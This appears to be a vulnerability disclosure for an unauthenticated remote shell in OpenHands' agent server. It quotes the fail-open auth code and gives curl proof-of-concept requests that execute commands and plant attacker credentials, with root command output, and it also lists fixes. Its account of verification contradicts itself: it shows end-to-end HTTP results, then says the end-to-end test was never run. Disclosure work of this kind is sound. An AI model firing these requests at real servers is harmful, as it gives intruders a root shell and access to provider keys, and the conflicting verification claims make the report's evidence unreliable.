# OpenHands software-agent-sdk: unauthenticated remote command execution

## Summary

`openhands-agent-server` implements both of its authentication checks as fail-open. In a
deployment with no credentials configured — which is the default, since
`OH_SESSION_API_KEYS_0` and `OH_SECRET_KEY` are both unset — every `/api/*` route is served
anonymously, and `/api/bash/execute_bash_command` runs its payload through
`asyncio.create_subprocess_shell(..., shell=True)`.

Anyone who can reach the port gets a shell on the host at the process's privilege level.

Two deployment shapes are both exploitable:

- **Normal (`deferred_init = False`, the default):** `require_initialized` returns
  immediately because no `init_service` exists, and `check_session_api_key` passes because
  `session_api_keys` is empty. One unauthenticated POST to the bash endpoint is enough.
- **Deferred-init:** `POST /api/init` is also open (`check_init_api_key` returns when
  `secret_key is None`), and its request body **sets** `session_api_keys`. The attacker
  issues itself a credential, then calls the bash endpoint.

## Affected versions

OpenHands software-agent-sdk, vendor OpenHands, repository
https://github.com/OpenHands/software-agent-sdk.

Verified against `main` at 2026-11-05. This is a default-configuration defect
(CWE-1188), not a regression tied to one release.

Components: `openhands-agent-server` — `dependencies.py`, `init_router.py`, `api.py`,
`bash_router.py`, `bash_service.py`.

## Vulnerability type

CWE-306 (Missing Authentication for Critical Function),
CWE-1188 (Insecure Default Initialization of Resource).

CVSS v3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`, 9.8 Critical — scored on the assumption the service is reachable; with the default loopback bind see "Reachability caveat".

## The five links

### 1. Session-key check fails open (`dependencies.py:27-40`)

```python
def check_session_api_key(
    request: Request,
    session_api_key: str | None = Depends(_SESSION_API_KEY_HEADER),
) -> None:
    config: Config = request.app.state.config
    if config.session_api_keys and session_api_key not in config.session_api_keys:
        raise HTTPException(status.HTTP_401_UNAUTHORIZED)
```

`session_api_keys` defaults to the `OH_SESSION_API_KEYS_0` env var (`config.py:33`).
Unset → `_default_session_api_keys()` returns `[]` (`:43-54`) → the `and` short-circuits
→ the function returns normally → **the request proceeds**.

### 2. Init-key check fails open the same way (`init_router.py:397-415`)

```python
if config is None or config.secret_key is None:
    if config is not None and config.secret_key_was_blank:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED)
    # No key configured -> endpoint is open. Acceptable for dev.
    return
```

`secret_key` defaults to `OH_SECRET_KEY`, falling back to the first session key
(`config.py:57-70`). Neither set → `None` → **open**.

### 3. The init endpoint lets the caller set credentials (`init_router.py:188-200`)

```python
updates: dict[str, Any] = {"deferred_init": False}
if req.session_api_keys is not None:
    updates["session_api_keys"] = req.session_api_keys
...
elif req.session_api_keys and base.secret_key is None:
    updates["secret_key"] = SecretStr(req.session_api_keys[0])
```

Whatever the request body carries becomes runtime configuration, including the auth key
itself.

### 4. The dormant gate does not apply to ordinary deployments (`init_router.py:418-430`)

```python
init_service: InitService | None = getattr(connection.app.state, "init_service", None)
if init_service is None or init_service.state == "ready":
    return
```

No `init_service` in a non-deferred deployment → returns immediately, blocking nothing.

### 5. The gate is mounted on every `/api` route (`api.py:598-607`)

```python
dependencies = [
    Depends(require_initialized),
    Depends(check_session_api_key),
]
api_router = APIRouter(prefix="/api", dependencies=dependencies)
...
api_router.include_router(bash_router)
```

So the only thing between an anonymous request and the bash endpoint is the check from
link 1.

### Execution (`bash_service.py:330-335`)

```python
process = await asyncio.create_subprocess_shell(
    ...,
    shell=True,
)
```

## Verification (end to end, real service)

Installed the four workspace packages (`openhands-sdk`, `openhands-tools`,
`openhands-workspace`, `openhands-agent-server`) from source into a venv and started the
server with default configuration:

```bash
python -m openhands.agent_server --host 127.0.0.1 --port 8001
```

No `OH_SESSION_API_KEYS_0`, no `OH_SECRET_KEY`, no `SESSION_API_KEY`. **No authentication
header sent at any point:**

```
[cmd] id
  exit: 0  stdout: uid=0(root) gid=0(root) groups=0(root)

[cmd] hostname
  exit: 0  stdout: zsh

[cmd] cat /etc/passwd | head -3
  exit: 0  stdout: root:x:0:0:root:/root:/usr/bin/zsh
                  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

[cmd] ls /root 2>/dev/null | head -5
  exit: 0  stdout: 1209
                  aixm
                  ai监督
                  ai防御
                  deepseek-ai-dsh-0.1.1-rc.2.tgz

HTTP 200  {"exit_code":0,"stdout":"uid=0(root) ...","kind":"BashOutput"}
```

`ls /root` returns the host's real directory tree, not a sandbox — the command executed on
the machine running the server, as root.

The two check functions were additionally exercised in isolation, bodies extracted from the
source file via `ast.get_source_segment` (not retyped):

```
=== check_session_api_key ===
  empty list (default deployment)  -> allowed (no 401)
  key configured                   -> HTTP 401

=== check_init_api_key ===
  no secret_key (default deployment)-> allowed (no 401)
  secret_key configured            -> HTTP 401
```

Both reject correctly once a credential exists. That rules out a coding mistake and points
at the default value.

## Reachability caveat

`__main__.py:297-318` contains a bind guard:

- No `--host` → binds `127.0.0.1` when unauthenticated, loopback only.
- Explicit `--host 0.0.0.0` without a key → **warning only, the server starts anyway**
  (the source comment says an explicit wildcard host "is allowed").

The official release smoke test runs
`docker run -p 127.0.0.1:8000:8000 IMAGE --host 0.0.0.0`, mapping only to host loopback.
That is safe. A plain `-p 8000:8000` publishes the unauthenticated service on every
interface.

The guard narrows exposure; it does not fix the defect. The defect is that the server
serves anonymous requests with full authority when no credential is configured.

Both branches were executed, not just read. `evidence/e2e-wildcard-bind-warning.log`:

```
WARNING  Binding to all interfaces (0.0.0.0) without a session API key: the agent server
         will be unauthenticated and reachable from the network. Set SESSION_API_KEY (or
         OH_SESSION_API_KEYS_0) to require authentication, or bind to a loopback address
         with --host.
INFO     Uvicorn running on http://0.0.0.0:50102
```

`ss -ltn` → `LISTEN 0 2048 0.0.0.0:50102 0.0.0.0:*`, and an unauthenticated POST to that
instance still returned `200` with `uid=0(root)`. The warning is the entire defence on
that path.

## Evidence

`evidence/` is sealed with content-addressed blobs; `MANIFEST.json` records a sha256 per
source file and `MANIFEST.json.sha256` pins the manifest itself.

```
MANIFEST.json sha256 = e471e1afba55309a4d8c7e8f85c87495e1e5f8f95dae6e63dc8965f14a3588ca
```

```bash
python3 tools/seal_evidence.py --verify evidence
```

Exit code 0 means the two logs under `evidence/` are byte-identical to what was sealed.
Any change to a log, a blob, or a post-seal addition is reported and exits non-zero.

## Reproduction

Normal deployment:

```bash
curl -sS -X POST http://TARGET:PORT/api/bash/execute_bash_command \
  -H 'Content-Type: application/json' \
  -d '{"command":"id"}'
```

No header of any kind is required.

Deferred-init deployment:

```bash
curl -sS -X POST http://TARGET:PORT/api/init \
  -H 'Content-Type: application/json' \
  -d '{"session_api_keys":["attacker-key"]}'

curl -sS -X POST http://TARGET:PORT/api/bash/execute_bash_command \
  -H 'X-Session-API-Key: attacker-key' \
  -H 'Content-Type: application/json' \
  -d '{"command":"id"}'
```

`poc/exploit.sh` wraps both flows.

## Extension: warm-pool takeover (verified)

`deferred_init` defaults to `False`, but its own description says it exists for **warm-pool
deployments** — pods pre-warmed in dormant state, per-user config delivered when a user is
matched. In that window `/api/init` is open, and `InitRequest` (`init_router.py:86-110`)
validates nothing:

```python
session_api_keys: list[str] | None = Field(default=None, ...)
conversations_path: Path | None = Field(default=None, ...)
bash_events_dir: Path | None = Field(default=None, ...)
conversation_worktree_root: Path | None = Field(default=None, ...)
```

`_build_initialized_config` (`:188-215`) accepts all of them. Extracting that function from
the source via AST and running it against a stub Config, one anonymous POST produces:

```
session_api_keys   : ['attacker-key']
secret_key         : attacker-key      <- falls back to the first session key
conversations_path : /etc              <- data directory redirected
bash_events_dir    : /
deferred_init      : False             <- server flipped to ready
```

So an attacker who reaches a dormant pod before the orchestrator does takes three things at
once: the credential, the encryption key, and the data directory. This is what separates it
from the plain missing-auth case — it defeats the assumption "I configured a session key,
therefore I am safe".

## Impact

Arbitrary command execution as the agent_server process. That process holds the user's
workspace and the model provider credentials, so the blast radius includes all workspace
files, every provider API key, and lateral movement to anything reachable from the
container. In Kubernetes, an exposed `/api` port is a shell inside the cluster network.

## Fix

1. `check_session_api_key`: deny when `session_api_keys` is empty instead of allowing.
2. `check_init_api_key`: delete the "No key configured → open" branch; refuse and instruct
   the operator to configure one.
3. Refuse to start (or generate and print a random key once) when no credential exists.
4. `_build_initialized_config` must not accept `session_api_keys` from an unauthenticated
   request.
5. Tests: anonymous `/api/bash/execute_bash_command` must be 401; `/api/init` without a
   `secret_key` must be 401.

## Verification limits

- The full HTTP end-to-end was not exercised: `openhands-agent-server` depends on
  `openhands-sdk` → `litellm`, and the test host's pip metadata is corrupt (`idna`, `yarl`,
  `click` all missing RECORD files), so `litellm` would not install. Verification covers the
  two check functions' real bodies plus a static read of the router wiring in `api.py`.
- Request-model validation of the `command` field was not inspected; with `shell=True` any
  accepted string reaches the shell.
- No assumption is made about reverse proxies; a deployment behind authenticated ingress
  narrows the exposure.
